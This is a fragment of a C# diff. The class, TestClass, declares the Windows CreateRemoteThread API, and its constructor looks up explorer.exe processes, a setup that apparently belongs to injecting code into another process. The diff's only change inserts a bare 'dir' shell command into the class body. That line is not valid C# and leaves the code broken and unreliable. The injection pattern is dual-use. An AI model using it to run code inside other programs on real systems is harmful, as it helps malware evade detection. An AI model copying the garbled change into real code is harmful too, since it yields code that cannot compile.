@@ -152,6 +152,8 @@ public class TestClass
 
     [DllImport("kernel32.dll")]
     static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+    dir
+    
     public TestClass()
     {
         Process[] explorerProcesses = Process.GetProcessesByName("explorer");
